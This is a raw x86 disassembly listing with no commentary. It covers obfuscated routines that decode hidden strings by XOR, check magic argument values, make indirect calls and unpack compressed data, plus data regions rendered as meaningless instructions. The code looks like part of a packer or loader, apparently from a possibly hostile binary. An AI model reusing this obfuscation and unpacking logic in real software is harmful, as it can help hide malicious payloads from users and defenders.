  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	xchg   esi,eax
  4165c5:	adc    ebx,DWORD PTR ds:0x5b6f8254
  4165cb:	inc    eax
  4165cc:	xchg   esi,eax
  4165cd:	cmp    DWORD PTR [esi-0x5764b656],ebx
  4165d3:	daa    
  4165d4:	add    DWORD PTR [eax],eax
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	inc    ebx
  4165d9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  4165dd:	jb     0x416651
  4165df:	outs   dx,BYTE PTR gs:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
